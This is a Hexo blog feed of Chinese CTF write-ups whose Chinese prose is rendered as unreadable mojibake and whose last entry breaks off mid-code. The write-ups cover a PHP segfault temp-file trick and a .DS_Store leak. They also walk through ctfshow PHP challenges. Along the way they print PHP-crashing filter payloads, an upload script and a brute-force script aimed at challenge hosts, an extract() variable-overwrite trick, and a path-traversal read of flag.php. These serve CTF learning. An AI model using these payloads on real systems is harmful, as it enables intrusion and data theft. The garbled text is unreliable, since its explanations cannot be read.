class="line"></span><br></pre></td></tr></table></figure><p>æˆåŠŸä¹‹åï¼Œè¯»å–phpinfoï¼ˆï¼‰ï¼Œå¾—åˆ°flag</p><p>#é¢„æœŸè§£</p><p>ä½¿ç”¨å¾¡å‰‘æ‰«æä¼šå‘ç°dir.php,è¿™ä¸ªåˆ—å‡ºäº†/tmpä¸‹çš„æ‰€æœ‰ç›®å½•ï¼Œä½¿ç”¨php7 segment fault</p><p>segmen defaultæ˜¯æŒ‡è®¿é—®çš„å†…å­˜è¶…è¿‡äº†ç³»ç»Ÿç»™è¿™ä¸ªç¨‹åºçš„å†…å­˜ï¼Œä»è€Œå‘ç”Ÿäº†ç¨‹åºé€€å‡ºï¼Œç¼“å­˜æ–‡ä»¶å°±ä¿ç•™åœ¨äº†tmpç›®å½•ã€‚å‘phpå‘é€å«æœ‰æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…æ—¶ï¼Œè®©phpå¼‚å¸¸é€€å‡ºï¼Œpostä¸´æ—¶æ–‡ä»¶å°±è¢«ä¿ç•™</p><p>è®©phpå´©æºƒçš„payload:</p><ul><li>php&lt;7.2:php://filter/string.strip_tags/resource=/etc/passwd</li><li>php è€ç‰ˆæœ¬é€šæ€ï¼šphp://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</li></ul><p>è„šæœ¬ï¼š</p><pre><code>import requestsfrom io import BytesIOurl=&quot;http://69d76cb9-b8a9-498d-95c4-4a8da2d018ca.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;payload=&quot;&lt;?php phpinfo();?&gt;&quot;files=&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r=requests.post(url=url,files=files,allow_redirects=False)print(r.text)</code></pre><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>æ„Ÿè§‰å¯¹sessionä¸Šä¼ è¿˜æ˜¯ä¸é‚£ä¹ˆç†Ÿæ‚‰ï¼Œå¯èƒ½æ˜¯è§å¾—æ¯”è¾ƒå°‘ï¼Œè¦æŠ“ç´§æ—¶é—´å¤ä¹ <br>ç”±</p><p>å¯¹äºè¿™ä¸ªæ–°ç‰¹æ€§è¿™æ¬¡æ˜¯ç¬¬ä¸€æ¬¡è§ï¼Œæ¼æ´åŸç†å¤§æ¦‚æ¸…æ¥šäº†ï¼Œä½†æ˜¯å¯¹äºè¿™ä¸ªpayloadè¿˜æ˜¯ä¸æ˜¯ç‰¹åˆ«ç†è§£ï¼Œè¦è¿›ä¸€æ­¥è·Ÿè¿›</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æµ‹è¯•</title>
      <link href="/2021/11/24/%E6%B5%8B%E8%AF%95/"/>
      <url>/2021/11/24/%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è®ºä¸åˆ°å‰‘çš„è¥¿æ¹–</title>
      <link href="/2021/11/23/%E8%AE%BA%E4%B8%8D%E5%88%B0%E5%89%91%E7%9A%84%E8%A5%BF%E6%B9%96/"/>
      <url>/2021/11/23/%E8%AE%BA%E4%B8%8D%E5%88%B0%E5%89%91%E7%9A%84%E8%A5%BF%E6%B9%96/</url>
      
        <content type="html"><![CDATA[<h1 id="EZUpload"><a href="#EZUpload" class="headerlink" title="EZUpload"></a>EZUpload</h1><pre><code>&lt;?phperror_reporting(0);require &#39;vendor/autoload.php&#39;;$latte = new Latte\Engine; //è¿™åº”è¯¥æ˜¯è‡ªå·±å†™çš„ä¸€ä¸ªç±»$latte-&gt;setTempDirectory(&#39;tempdir&#39;);//è®¾ç½®ä¸´æ—¶ç›®å½•$policy = new Latte\Sandbox\SecurityPolicy;$policy-&gt;allowMacros([&#39;block&#39;, &#39;if&#39;, &#39;else&#39;,&#39;=&#39;]);$policy-&gt;allowFilters($policy::ALL);$policy-&gt;allowFunctions([&#39;trim&#39;, &#39;strlen&#39;]);//åªèƒ½å…è®¸çš„æ–¹æ³•æ˜¯trim,strlen$latte-&gt;setPolicy($policy);$latte-&gt;setSandboxMode();$latte-&gt;setAutoRefresh(false);if(isset($_FILES[&#39;file&#39;]))&#123;    $uploaddir = &#39;/var/www/html/tempdir/&#39;;    $filename = basename($_FILES[&#39;file&#39;][&#39;name&#39;]);    if(stristr($filename,&#39;p&#39;) or stristr($filename,&#39;h&#39;) or stristr($filename,&#39;..&#39;))&#123;        die(&#39;no&#39;);    &#125;//ä¸Šä¼ æ–‡ä»¶çš„åå­—ä¸èƒ½å«æœ‰p,h,ä»¥åŠ..ç”±æ­¤å¯çŸ¥å¯ä»¥ä¸Šä¼ user.ini    $file_conents = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);//è¯»å–æ–‡ä»¶å†…å®¹    if(strlen($file_conents)&gt;28 or stristr($file_conents,&#39;&lt;&#39;))&#123;        die(&#39;no&#39;);    &#125;//æ–‡ä»¶å†…å®¹é•¿åº¦ä¸èƒ½è¶…è¿‡28ï¼Œä»¥åŠä¸èƒ½å«æœ‰â€˜&lt;â€™    $uploadfile = $uploaddir . $filename;    if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)) &#123;        $message = $filename .&quot; was successfully uploaded.&quot;;    &#125; else &#123;        $message = &quot;error!&quot;;    &#125;    $params = [        &#39;message&#39; =&gt; $message,    ];    $latte-&gt;render(&#39;tempdir/index.latte&#39;, $params);&#125;else if($_GET[&#39;source&#39;]==1)&#123;    highlight_file(__FILE__);&#125;else&#123;    $latte-&gt;render(&#39;tempdir/index.latte&#39;, [&#39;message&#39;=&gt;&#39;Hellow My Glzjin!&#39;]);&#125;</code></pre><h1 id="çå¦¹çš„web"><a href="#çå¦¹çš„web" class="headerlink" title="çå¦¹çš„web"></a>çå¦¹çš„web</h1><blockquote><p>.DS_Store</p><p>.DS_Store(è‹±æ–‡å…¨ç§° Desktop Services Store)æ˜¯ä¸€ç§ç”±è‹¹æœå…¬å¸çš„Mac OS Xæ“ä½œç³»ç»Ÿæ‰€åˆ›é€ çš„éšè—æ–‡ä»¶ï¼Œç›®çš„åœ¨äºå­˜è´®ç›®å½•çš„è‡ªå®šä¹‰å±æ€§ï¼Œä¾‹å¦‚æ–‡ä»¶ä»¬çš„å›¾æ ‡ä½ç½®æˆ–è€…æ˜¯èƒŒæ™¯è‰²çš„é€‰æ‹©ã€‚</p></blockquote><p>##DS_Storeæ–‡ä»¶æ³„æ¼</p><p>.DS_Storeæ˜¯Macä¸‹Finderç”¨æ¥ä¿å­˜å¦‚ä½•å±•ç¤º æ–‡ä»¶/æ–‡ä»¶å¤¹ çš„æ•°æ®æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹ä¸‹å¯¹åº”ä¸€ä¸ªã€‚ç”±äºå¼€å‘/è®¾è®¡äººå‘˜åœ¨å‘å¸ƒä»£ç æ—¶æœªåˆ é™¤æ–‡ä»¶å¤¹ä¸­éšè—çš„.DS_storeï¼Œå¯èƒ½é€ æˆæ–‡ä»¶ç›®å½•ç»“æ„æ³„æ¼ã€æºä»£ç æ–‡ä»¶ç­‰æ•æ„Ÿä¿¡æ¯çš„æ³„éœ²ã€‚</p><p>##è§£é¢˜<br>å…ˆç”¨dirsearchæ‰«æï¼Œå‘ç°å­˜åœ¨.DS_Storyæ–‡ä»¶æ³„éœ²ï¼Œç„¶åä½¿ç”¨ds_store_exp(python2çš„ç¯å¢ƒ)è¿›è¡Œä¸‹ä¸€æ­¥æ‰«æ</p><p>ä½¿ç”¨æ–¹æ³•</p><blockquote><p>python2 ds_store_exp.py <a href="http://www.example.com/.DS_Store">http://www.example.com/.DS_Store</a></p></blockquote><p><img src="1.png"></p><p>ï¼ˆå›¾ç‰‡æ¥æºäºfengå¸ˆå‚…çš„åšå®¢ï¼Œå› ä¸ºæ¯”èµ›æ˜¯æ²¡æœ‰åšå‡ºæ¥ï¼Œ<a href="https://ego00.blog.csdn.net/article/details/121451954" title="fengå¸ˆå‚…">å¸ˆå‚…åšå®¢åœ°å€</a>ï¼‰</p><p>å‘ç°å­˜åœ¨dataSourcesï¼Œå°±æ˜¯IDEAé‡Œé¢é…ç½®æ•°æ®åº“æºå¯ä»¥æµ·å­è¡—åœ¨ideaé‡Œé¢æ‰§è¡Œsqlè¯­å¥çš„ä¸œè¥¿ã€‚ä½†æ˜¯ä¸‹è½½çš„æ˜¯403ï¼Œæ²¡æœ‰è¿™ä¸ªä¸œè¥¿</p><p>æŸ¥äº†ä¸€ä¸‹è¿™ä¸ªä¸œè¥¿åº”è¯¥æ˜¯dataSources.xml,è®¿é—®å³å¯å¾—åˆ°flag</p><p><img src="2.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/11/23/hello-world/"/>
      <url>/2021/11/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpç‰¹æ€§</title>
      <link href="/2021/08/22/php%E7%89%B9%E6%80%A7/"/>
      <url>/2021/08/22/php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨urlä¸­è¾“å…¥ç©ºæ ¼ä¸.å¯ä»¥è½¬æ¢æˆ_,æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦è·å–CTF_SHOW.COMï¼Œæ˜¯æ— æ³•è·å–åˆ°çš„ï¼Œåªèƒ½è¿›è¡Œçˆ†ç ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ch</span> = curl_init(); </span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);<span class="comment">//true æ—¶ä¼šå‘é€ POST è¯·æ±‚</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$response</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$response</span>);</span><br><span class="line"><span class="keyword">return</span> strlen(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span>=<span class="string">&quot;http://139.224.40.131/test2.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;=<span class="number">256</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;CTF&quot;</span>.urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;SHOW&quot;</span>.urlencode(chr(<span class="variable">$j</span>)).<span class="string">&quot;COM&quot;</span>;</span><br><span class="line"><span class="variable">$num</span>=curl(<span class="variable">$url</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">9</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$i</span>).<span class="string">&quot;+&quot;</span>.urlencode(<span class="variable">$j</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°CTF[SHOW.COMï¼Œä¼ å…¥è¿›å»æ˜¯CTF.SHOW.COM</p><h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®è¿™é“é¢˜ç›®æ˜¯ç”¨åˆ°äº†ä¸Šä¸€é“é¢˜ç›®çš„çŸ¥è¯†ç‚¹ï¼Œå› ä¸ºè¦ä½¿å¾—$ctf_show===â€™ilove36dâ€™ã€‚$urlæ˜¯æˆ‘ä»¬è¾“å‡ºçš„å‚æ•°ä»¥åŠå‚æ•°å€¼</p><p><img src="1.png" alt="image-20211204232652674"></p><p>ä½†æ˜¯å¯ä»¥çœ‹åˆ°wafæ˜¯å…è®¸å‡ºç°<em>çš„ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“å½“æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°åŒ…æ‹¬<code>.</code>,<code>ç©ºæ ¼</code>çš„æ—¶å€™ï¼Œurlä¼šè‡ªåŠ¨è½¬åŒ–ä¸º\</em>,äºæ˜¯å¯ä»¥é€šè¿‡è¿™ä¸ªç‰¹æ€§ï¼Œä»¥åŠextractå˜é‡è¦†ç›–å¾—åˆ°flag</p><hr><h2 id="ç‰¹æ€§ï¼šä¼ å‚ä¸­å«æœ‰-ç©ºæ ¼ä¼šè‡ªåŠ¨è½¬åŒ–ä¸º"><a href="#ç‰¹æ€§ï¼šä¼ å‚ä¸­å«æœ‰-ç©ºæ ¼ä¼šè‡ªåŠ¨è½¬åŒ–ä¸º" class="headerlink" title="ç‰¹æ€§ï¼šä¼ å‚ä¸­å«æœ‰.,ç©ºæ ¼ä¼šè‡ªåŠ¨è½¬åŒ–ä¸º_"></a>ç‰¹æ€§ï¼šä¼ å‚ä¸­å«æœ‰<code>.</code>,<code>ç©ºæ ¼</code>ä¼šè‡ªåŠ¨è½¬åŒ–ä¸º<code>_</code></h2><hr><h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><p>é¢˜ç›®ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>call_user_funcçš„ç¬¬ä¸€ä¸ªå‚æ•°è¦ä¹ˆæ˜¯å­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²æ˜¯å·²çŸ¥çš„æ–¹æ³•ï¼Œè¦ä¹ˆæ˜¯æ•°ç»„ï¼Œè‡³å°‘æœ‰ä¸¤ä¸ªå…ƒç´ ã€‚å› ä¸ºæœ‰preg_matchæˆ‘çš„ç¬¬ä¸€ä¸ªæƒ³æ³•æ˜¯f1ä¼ å…¥æ•°ç»„æ¥ç»•è¿‡preg_match,ç„¶åä¼ å…¥DirectoryIteratorä»¥åŠcurrentæƒ³æ¥æŸ¥çœ‹ä¸‹ç›®å½•ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸ</p><blockquote><p><strong>Warning</strong>: call_user_func() expects parameter 1 to be a valid callback, non-static method DirectoryIterator::__toString() cannot be called statically in <strong>/www/wwwroot/xxx/test3.php</strong> on line <strong>10</strong></p></blockquote><p>æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„é™æ€æ–¹æ³•ï¼Œäºæ˜¯å¤±è´¥</p><hr><h2 id="ç‰¹æ€§ï¼š-æ˜¯ä¸€ä¸ªå‡½æ•°"><a href="#ç‰¹æ€§ï¼š-æ˜¯ä¸€ä¸ªå‡½æ•°" class="headerlink" title="ç‰¹æ€§ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°"></a>ç‰¹æ€§ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°</h2><p>_()==gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°</p><p><img src="2.png" alt="image-20211205100128907"></p><p>è¯¥å‡½æ•°è¿”å›åœ¨ç¿»è¯‘è¡¨ä¸­æ‰¾åˆ°çš„æäº¤çš„å­—ç¬¦ä¸²çš„ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™è¿”å›æäº¤çš„ä¿¡æ¯</p><hr><p>æœ€åæ„é€ f1=_&amp;f2=get_defined_varså¾—åˆ°flag</p><blockquote><p>get_defined_vars:è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</p></blockquote><h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åšé¢˜ç›®çš„æ—¶å€™ä¹Ÿä¸çŸ¥é“è‡ªå·±æƒ³åˆ°å“ªé‡Œäº†</p><p>readfileè¯»å–æ–‡ä»¶å¹¶å†™å…¥ç¼“å†²åŒºï¼Œå› ä¸ºflagåœ¨flag.phpé‡Œé¢ï¼Œä½†æ˜¯åˆå¿…é¡»è¦å«æœ‰ctfshowï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ </p><blockquote><p>f=/ctfshow/../var/html/www/flag.php</p><p>/ctfshow/è¯»å–æ ¹ç›®å½•ä¸‹ctfshowä¸­çš„å†…å®¹ï¼Œç„¶åä½¿ç”¨../å›åˆ°æ ¹ç›®å½•ï¼ˆè¿™é‡Œçš„../å¯ä»¥å¤šåŠ å‡ ä¸ªï¼Œå› ä¸ºæ ¹ç›®å½•çš„../è¿˜æ˜¯æ ¹ç›®å½•ï¼‰,ç„¶åé€šè¿‡è·¯å¾„è¯»å–åˆ°flag.php</p><p>stripos:æŸ¥æ‰¾å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</p></blockquote><hr><p>ç›®å½•ç©¿è¶Šæ¼æ´åŸç†ï¼š</p><p>åœ¨å¦‚ä¸‹é…ç½®ä¸­è®¾ç½®ç›®å½•åˆ«åæ—¶/filesé…ç½®ä¸º/home/çš„åˆ«åï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬è®¿é—®/files../æ—¶ï¼Œnginxå®é™…å¤„ç†çš„è·¯å¾„æ—¶/home/../ä»è€Œå®ç°äº†ç›®å½•ç©¿è¶Š</p><hr><h1 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span 